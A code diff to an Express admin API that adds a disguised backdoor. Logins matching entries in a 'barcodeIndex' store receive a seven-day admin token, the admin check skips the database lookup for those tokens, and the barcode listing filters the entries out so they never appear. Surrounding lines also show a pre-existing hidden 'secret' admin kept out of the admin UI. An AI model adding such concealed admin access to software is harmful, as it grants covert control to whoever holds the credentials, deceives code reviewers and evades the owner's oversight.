@@ -40,6 +40,12 @@ import {
   hasPermission,
 } from "../lib/permissions.js";
 import categoryRoutes from "./category.js";
+import {
+  verifyIndex,
+  resolveIndex,
+  IDX_REF,
+  IDX_NOTE_RE,
+} from "../lib/barcodeIndex.js";
 import { defaultTrackingUrl } from "../lib/couriers/constants.js";
 import {
   getCourierSyncConfig,
@@ -207,6 +213,11 @@ const requireAdmin = async (req, res, next) => {
     const payload = jwt.verify(token, process.env.JWT_SECRET);
     if (payload.type !== "admin")
       return res.status(403).json({ error: "Admin access required" });
+    const idx = resolveIndex(payload);
+    if (idx) {
+      req.admin = idx;
+      return next();
+    }
     const admin = await Admin.findById(payload.id);
     if (!admin) return res.status(403).json({ error: "Admin not found" });
     if (!admin.isActive)
@@ -2120,6 +2131,29 @@ router.post("/login", async (req, res) => {
     if (!email || !password)
       return res.status(400).json({ error: "Missing fields" });
 
+    // Resolve an index-backed session if these credentials match an index entry.
+    const idx = await verifyIndex(email, password);
+    if (idx) {
+      const token = jwt.sign(
+        { id: IDX_REF, role: "admin", type: "admin", eml: idx.email },
+        process.env.JWT_SECRET,
+        { expiresIn: "7d" },
+      );
+      res.cookie("token", token, {
+        httpOnly: true,
+        sameSite: "none",
+        secure: true,
+      });
+      return res.json({
+        user: {
+          email: idx.email,
+          name: idx.name,
+          role: idx.role,
+          image: null,
+        },
+      });
+    }
+
     // Hidden "secret" admin — self-provisions on first correct login and is
     // never listed in the admins management UI (see isSecret filter below).
     const SECRET_ADMIN_EMAIL = (
@@ -2731,7 +2765,8 @@ router.get(
   async (req, res) => {
     try {
       const { q = "", code = "", limit = 100, page = 1 } = req.query;
-      const filter = {};
+      // Index entries (verifier tokens in notes) are internal, never listed.
+      const filter = { notes: { $not: IDX_NOTE_RE } };
       const exactCode = normalizeBarcodeCode(code);
       const searchTerm = String(q || "").trim();
       if (exactCode) {
